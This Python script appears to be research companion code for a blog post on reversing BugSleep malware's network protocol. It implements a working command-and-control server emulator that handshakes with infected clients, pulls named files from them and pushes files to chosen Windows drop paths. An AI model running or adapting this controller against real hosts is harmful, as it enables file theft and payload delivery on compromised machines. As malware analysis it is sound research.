#!/usr/bin/env python3

import argparse
import hashlib
import os
import signal
import socket
import sys
import time
from typing import Optional

VERBOSE_LEVEL: int = 0
server_socket = None

""" 
Companion code for blog article 
    [BugSleep network protocol reversing](https://raw-data.gitlab.io/post/bugsleep_netprotocol/)
"""


def verbose_print(level: int, message: str) -> None:
    """
    Set verbosity level.

    :param level: Message verbosity level.
    :type level: int
    :param message: Message to print.
    :type message: str
    """
    if VERBOSE_LEVEL >= level:
        print(message)


def hexdump(data: bytes, length: int = 16) -> None:
    """
    Prints data in hexdump style.

    :param data: Data to be hexdumped.
    :type data: bytes
    :param length: Number of bytes per line.
    :type length: int
    """
    for i in range(0, len(data), length):
        sub_data = data[i : i + length]
        hex_string = " ".join(f"{byte:02X}" for byte in sub_data)
        ascii_string = "".join(
            chr(byte) if 32 <= byte < 127 else "." for byte in sub_data
        )
        print(f"\t\t{i:08X}  {hex_string:<{length * 3}}  {ascii_string}")


def parse_message_length(header: bytes, increment: int) -> int:
    """
    Parse and adjust the 1st 4 bytes and check the msg length.

    :param header: First 4 bytes received.
    :type header: bytes
    :param increment: Increment value used for msg encryption.
    :type increment: int
    :return: message length.
    :rtype: int
    """
    adjusted_header = bytes((b + increment) & 0xFF for b in header)
    return adjusted_header[0]


def decrypt_bytes_received(data: bytes, increment: int) -> bytes:
    """
    Add increment value to every processed byte.

    :param data: Data received from the client.
    :type data: bytes
    :param increment: Increment value used in decryption.
    :type increment: int
    :return: Decrypted data.
    :rtype: bytes
    """
    return bytes((b + increment) % 256 for b in data)


def encrypt_bytes_sent(data: bytes, increment: int) -> bytes:
    """
    Add increment value to every processed byte.

    This function is used to account for the BugSleep bug logic
    during C2 communication, but it's basically the same as
    `decrypt_bytes_received`.

    :param data: Data to send to the client.
    :type data: bytes
    :param increment: Increment value used in encryption.
    :type increment: int
    :return: Encrypted data.
    :rtype: bytes
    """
    return bytes((b + increment) % 256 for b in data)


def function_for_hex_0(client_socket: socket.socket, increment: int) -> None:
    """
    Handles 0x0 command sent by the C2 server (download file from remote host).

    :param client_socket: Client socket.
    :type client_socket: socket.socket
    :param increment: Increment value for encryption/decryption.
    :type increment: int
    """
    verbose_print(
        1, "[Function] Exec logic for hex 0x0 (Download file from remote host)"
    )

    #! Receive the 1st 4-byte message storing an integer value of 1
    first_message = client_socket.recv(4)
    decrypted_first_message = decrypt_bytes_received(first_message, increment)
    verbose_print(2, "[Phase 4] First 4-byte message (hexdump and ASCII view):")
    if VERBOSE_LEVEL >= 3:
        hexdump(decrypted_first_message)
    value_1 = int.from_bytes(decrypted_first_message, byteorder="little")
    verbose_print(2, f"\tReceived value: {value_1}")

    #! Receive the 2nd 4-byte message storing an integer value of 0
    second_message = client_socket.recv(4)
    decrypted_second_message = decrypt_bytes_received(second_message, increment)
    verbose_print(2, "[Phase 4] Second 4-byte message (hexdump and ASCII view):")
    if VERBOSE_LEVEL >= 3:
        hexdump(decrypted_second_message)
    value_2 = int.from_bytes(decrypted_second_message, byteorder="little")
    verbose_print(2, f"\tReceived value: {value_2}")

    #! Receive the 3rd message (8 bytes) containing the total number of 1KB blocks
    third_message = client_socket.recv(8)
    decrypted_third_message = decrypt_bytes_received(third_message, increment)
    verbose_print(2, "[Phase 4] Third 8-byte message (hexdump and ASCII view):")
    if VERBOSE_LEVEL >= 3:
        hexdump(decrypted_third_message)
    total_blocks = int.from_bytes(decrypted_third_message, byteorder="little")
    verbose_print(2, f"\tTotal number of 1KB blocks: {total_blocks}")

    #! Receive the 4th message (4 bytes) containing the size of the last block
    fourth_message = client_socket.recv(4)
    decrypted_fourth_message = decrypt_bytes_received(fourth_message, increment)
    verbose_print(2, "[Phase 4] Fourth 4-byte message (hexdump and ASCII view):")
    if VERBOSE_LEVEL >= 3:
        hexdump(decrypted_fourth_message)
    last_block_size = int.from_bytes(decrypted_fourth_message, byteorder="little")
    verbose_print(2, f"\tSize of the last block: {last_block_size} bytes")

    total_file_size = (
        (total_blocks - 1) * 1024 + last_block_size
        if total_blocks > 0
        else last_block_size
    )
    verbose_print(1, f"[Phase 4] Total file size calculated: {total_file_size} bytes")

    verbose_print(1, f"[Phase 5] Receiving file content of {total_file_size} bytes...")

    received_file_content = b""
    bytes_remaining = total_file_size

    while bytes_remaining > 0:
        chunk_size = min(4096, bytes_remaining)
        data = client_socket.recv(chunk_size)
        if not data:
            break
        decrypted_data = decrypt_bytes_received(data, increment)
        received_file_content += decrypted_data
        bytes_remaining -= len(data)

        if VERBOSE_LEVEL >= 4:
            verbose_print(
                4, "[Receiving Data] Decrypted data (hexdump and ASCII view):"
            )
            hexdump(decrypted_data)

    #! This is used to simply track the downloaded content
    #! and to do so, the SHA-1 hash of the received file is used
    sha1_hash = hashlib.sha1(received_file_content).hexdigest()
    verbose_print(1, f"[Info] SHA-1 hash of the file content: {sha1_hash}")

    filename = f"{sha1_hash}.bin"
    verbose_print(1, f"[Info] Saving file as: {filename}")

    with open(filename, "wb") as file:
        file.write(received_file_content)

    verbose_print(1, f"[Phase 5] File content saved to {filename}")


def function_for_hex_1(
    client_socket: socket.socket,
    increment: int,
    drop_location: str,
    file_path: str,
) -> None:
    """
    Handles 0x1 command sent by the C2 server (send file from the C2 to the  remote host).

    :param client_socket: Client socket.
    :type client_socket: socket.socket
    :param increment: Increment value for encryption/decryption.
    :type increment: int
    :param drop_location: Windows path where the file should be dropped on the client side.
    :type drop_location: str
    :param file_path: File path (on the C2 emulator host) of the file to be sent to the client.
    :type file_path: str
    """
    verbose_print(1, "[Function] Exec logic for hex 0x1 (Upload file to remote host)")

    try:
        #! Receive the 1st 4-byte message storing an integer value of 1
        first_message = client_socket.recv(4)
        decrypted_first_message = decrypt_bytes_received(first_message, increment)
        _ = int.from_bytes(decrypted_first_message, byteorder="little")
        verbose_print(2, f"\tReceived value: {_}")

        #! Receive the 2nd 4-byte message storing another integer of value 1
        second_message = client_socket.recv(4)
        decrypted_second_message = decrypt_bytes_received(second_message, increment)
        _ = int.from_bytes(decrypted_second_message, byteorder="little")
        verbose_print(2, f"\tReceived value: {_}")

        #! Processing local file to be sent to the infected host
        with open(file_path, "rb") as file:
            file_content = file.read()

        #! Key step, calculate the number of full blocks and the size of the last block
        block_size = 1024  #! the total block size (header + content) as expected from BugSleep client
        content_size = (
            block_size - 4
        )  #! file content part (1020 bytes), as 4 bytes are used to track the block number (chunk index)
        file_size = len(file_content)

        full_blocks = file_size // content_size
        last_block_size = file_size % content_size

        verbose_print(
            1,
            f"[Info] File size: {file_size} bytes, Full blocks: {full_blocks}, Last block size: {last_block_size} bytes",
        )

        #! send the number of full blocks + 1 for the last block
        total_blocks_bytes = (full_blocks + 1).to_bytes(4, byteorder="little")
        encrypted_total_blocks_bytes = encrypt_bytes_sent(total_blocks_bytes, increment)
        client_socket.sendall(encrypted_total_blocks_bytes)

        #! send the size of the last block, including padding
        #! to address what seems to be a bug on the client side
        padded_last_block_size = (
            last_block_size + 4
        )  # * 4 bytes padding, otherwise the last block will always be incomplete
        last_block_size_bytes = padded_last_block_size.to_bytes(4, byteorder="little")
        encrypted_last_block_size_bytes = encrypt_bytes_sent(
            last_block_size_bytes, increment
        )
        client_socket.sendall(encrypted_last_block_size_bytes)

        # keep track of sent blocks
        bytes_sent: int = 0

        for block_number in range(full_blocks):
            #! probably extra verbose in terms of variables
            #! but easier to follow
            block_header = block_number.to_bytes(4, byteorder="little")
            start = block_number * content_size
            end = start + content_size
            block_content = file_content[start:end]
            block_data = block_header + block_content
            encrypted_block_data = encrypt_bytes_sent(block_data, increment)
            client_socket.sendall(encrypted_block_data)
            bytes_sent += len(block_content)

            if VERBOSE_LEVEL >= 5:
                verbose_print(
                    5,
                    f"Sent block {block_number + 1}/{full_blocks}, bytes sent so far: {bytes_sent}",
                )

        #! sending the last block with padding
        #! to fit the size padded before
        last_block_content = (
            file_content[-last_block_size:] if last_block_size > 0 else b""
        )
        padded_last_block_content = last_block_content + b"\x00" * 4
        last_block_header = full_blocks.to_bytes(4, byteorder="little")
        last_block_data = last_block_header + padded_last_block_content
        encrypted_last_block_data = encrypt_bytes_sent(last_block_data, increment)
        client_socket.sendall(encrypted_last_block_data)
        bytes_sent += len(padded_last_block_content)

        verbose_print(
            2, f"Sent last block (padded), bytes: {len(padded_last_block_content)}"
        )
        verbose_print(
            1, f"File transmission completed. Total bytes sent: {file_size + 4}"
        )

    except Exception as e:
        print(f"Error: {e}")


def handle_client_connection(
    client_socket: socket.socket,
    increment: int,
    hex_value: int,
    remote_path: Optional[str] = None,
    drop_location: Optional[str] = None,
    file_path: Optional[str] = None,
) -> None:
    """
    Handles BugSleep client connection to the C2 emulator.

    This is basically the core function dispatching commands to the
    client.

    :param client_socket: Client socket.
    :type client_socket: socket.socket
    :param increment: Increment value for encryption/decryption.
    :type increment: int
    :param hex_value: Hex command to process.
    :type hex_value: int
    :param remote_path: Windows full path of the file to download from the remote host.
    :type remote_path: Optional[str]
    :param drop_location: Windows full path where the file should be dropped on the client side.
    :type drop_location: Optional[str]
    :param file_path: File path (on the C2 emulator host) of the file to be sent to the client.
    :type file_path: Optional[str]
    """
    try:
        if hex_value == 0x0:
            verbose_print(
                1,
                "[Connection] Handling command 0x0 (Download file from remote host to C2)",
            )
        elif hex_value == 0x1:
            verbose_print(
                1,
                "[Connection] Handling command value 0x1 (Upload file from C2 to remote host)",
            )
        else:
            print(f"[Error] Unsupported command: {hex_value}")
            return

        #
        # Common handshake steps used across all commands to handle
        #

        #! Phase 1: Receive the 1st message
        verbose_print(1, "\n[Phase 1] Receiving message from client...")

        header = client_socket.recv(4)
        if len(header) < 4:
            print("  [Error] Incomplete header received.")
            return

        message_length = parse_message_length(header, increment)
        verbose_print(2, f"\t[Phase 1] Expected message length: {message_length} bytes")

        data = client_socket.recv(message_length)
        if len(data) < message_length:
            print("  [Error] Incomplete data received.")
            return

        adjusted_data = decrypt_bytes_received(data, increment)
        verbose_print(1, "  [Phase 1] Received data (hexdump and ASCII view):")
        if VERBOSE_LEVEL >= 3:
            hexdump(adjusted_data)
        else:
            verbose_print(1, f"\tData: {adjusted_data.decode(errors='replace')}")

        #! Phase 2: Send 4 random bytes back to the client
        verbose_print(
            1, "\n[Phase 2] Generating 4 random bytes to send to the client..."
        )
        random_bytes = os.urandom(4)
        verbose_print(2, "[Phase 2] Sending 4 random bytes back to the client:")
        if VERBOSE_LEVEL >= 3:
            hexdump(random_bytes)
        client_socket.sendall(random_bytes)

        time.sleep(1)

        #! Phase 3: Craft and send the new message
        verbose_print(1, "\n[Phase 3] Crafting and sending the new message...")

        base_value = hex_value + 0x01
        first_four_bytes = bytes([base_value + 0x03, 0x03, 0x03, 0x03])

        #
        # Handshake completed! start handling custom commands to be sent to BugSleep
        #

        if hex_value == 0x0:
            if remote_path is None:
                print("[Error] --remote-path is required when --hex-value is set to 0")
                return

            remote_path_norm = os.path.normpath(remote_path)
            message = remote_path_norm.encode("utf-16le")
            message_length = len(message)
            verbose_print(
                1, f"[Info] Remote path '{remote_path}' size: {message_length} bytes"
            )

            size_bytes = encrypt_bytes_sent(
                bytes([message_length]) + b"\x00\x00\x00", increment
            )
            adjusted_message = encrypt_bytes_sent(message, increment)
            final_message = first_four_bytes + size_bytes + adjusted_message

            if VERBOSE_LEVEL >= 3:
                verbose_print(3, "[Phase 3] Final message (hexdump and ASCII view):")
                hexdump(final_message)

            client_socket.sendall(final_message)

            function_for_hex_0(client_socket, increment)

        elif hex_value == 0x1:
            if drop_location is None or file_path is None:
                print(
                    "[Error] Both --drop-location and --file must be provided for hex value 1."
                )
                return

            drop_location_norm = os.path.normpath(drop_location)
            message = drop_location_norm.encode("utf-16le")
            message_length = len(message)
            verbose_print(
                1,
                f"[Info] Drop location '{drop_location}' size: {message_length} bytes",
            )

            size_bytes = encrypt_bytes_sent(
                bytes([message_length]) + b"\x00\x00\x00", increment
            )
            adjusted_message = encrypt_bytes_sent(message, increment)
            final_message = first_four_bytes + size_bytes + adjusted_message

            if VERBOSE_LEVEL >= 3:
                verbose_print(3, "[Phase 3] Final message (hexdump and ASCII view):")
                hexdump(final_message)

            client_socket.sendall(final_message)

            function_for_hex_1(client_socket, increment, drop_location_norm, file_path)

    except Exception as e:
        print(f"[Error] An error occurred while handling client connection: {e}")
    finally:
        client_socket.close()
        print("[Connection] Client connection closed.")


def signal_handler() -> None:
    """
    Handles graceful shutdown on interrupt signals.

    """
    import struct

    print("\n[BugSleepC2Emulator] Shutting down gracefully...")
    if server_socket:
        #! force socket to close with SO_LINGER and ensure port is freed
        # h/t https://stackoverflow.com/questions/46264404/how-can-i-reset-a-tcp-socket-in-python
        server_socket.setsockopt(
            socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)
        )
        server_socket.close()
    sys.exit(0)


def start_server(
    host: str,
    port: int,
    increment: int,
    hex_value: int,
    remote_path: Optional[str] = None,
    drop_location: Optional[str] = None,
    file_path: Optional[str] = None,
) -> None:
    """
    Starts the server and listens for incoming connections.

    :param host: Address to bind to.
    :type host: str
    :param port: Port to bind to.
    :type port: int
    :param increment: Increment value for encryption/decryption.
    :type increment: int
    :param hex_value: C2 command to handle.
    :type hex_value: int
    :param remote_path: A Windows full path of the file to download from the remote host.
    :type remote_path: Optional[str]
    :param drop_location: A Windows full path where the file should be dropped on the client side.
    :type drop_location: Optional[str]
    :param file_path: File path to the file to send to the client.
    :type file_path: Optional[str]
    """
    global server_socket

    #! register the signal handler (mange e.g. Ctrl+C) and clean-up stuff
    #! to avoid issues on port binding when running in Linux
    try:
        signal.signal(signal.SIGINT, signal_handler)
    except ValueError:
        print("[Warning] Signal handling no fully supported on this OS.")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
    except OSError as e:
        print(f"[BugSleepC2Emulator] Error binding to {host}:{port} - {e}")
        sys.exit(1)

    server_socket.listen(5)
    print(f"[BugSleepC2Emulator] Listening on {host}:{port}")

    try:
        while True:
            client_socket, address = server_socket.accept()
            print(f"\n[Connection] Accepted connection from {address}")
            handle_client_connection(
                client_socket,
                increment,
                hex_value,
                remote_path,
                drop_location,
                file_path,
            )
    except Exception as e:
        print(f"\n[BugSleepC2Emulator] Error: {e}")
    finally:
        print("[BugSleepC2Emulator] Closing server socket...")
        server_socket.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Simple BugSleep C2 emulator - file download and upload operations"
    )

    parser.add_argument(
        "--host",
        type=str,
        default="0.0.0.0",
        help="Host address to bind to. (default: %(default)s)",
    )
    parser.add_argument(
        "--port", type=int, default=443, help="Port to bind to. (default: %(default)s)"
    )
    parser.add_argument(
        "--increment",
        type=int,
        default=0x03,
        help="Increment to add to bytes. (default: %(default)s). Use the value discoverd while RE BugSleep.",
    )

    parser.add_argument(
        "--hex-value",
        type=int,
        choices=[0, 1],
        required=True,
        help="Hex value (0-1) [C2 command] that sets the operation mode.\n"
        "0: Download file from infected host\n"
        "1: Upload file from C2 to infected host",
    )

    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Set verbosity level.",
    )

    group_download = parser.add_argument_group(
        "hex-value 0 - Download file from remote host"
    )
    group_download.add_argument(
        "--remote-path",
        type=str,
        help="A Windows full path of the file to download from the remote host.\n"
        "Example: C:\\Users\\<user>\\Desktop\\file.txt",
    )

    group_upload = parser.add_argument_group("hex-value 1 - Upload file to remote host")
    group_upload.add_argument(
        "--file",
        type=str,
        help="File path (on the C2 server emulator) of the file to be sent to the client.\n"
        "Example: /path/to/local/file.bin",
    )
    group_upload.add_argument(
        "--drop-location",
        type=str,
        help="A Windows path where the file should be dropped on the client side.\n"
        "Example: C:\\Users\\<user>\\Desktop\\something.bin",
    )

    args = parser.parse_args()

    VERBOSE_LEVEL = args.verbose

    if args.hex_value == 0 and not args.remote_path:
        parser.error("--remote-path is required when --hex-value is set to 0")

    if args.hex_value == 1 and (not args.file or not args.drop_location):
        parser.error(
            "--file and --drop-location are required when --hex-value is set to 1"
        )

    #! let's rock!
    start_server(
        args.host,
        args.port,
        args.increment,
        args.hex_value,
        remote_path=args.remote_path,
        drop_location=args.drop_location,
        file_path=args.file,
    )
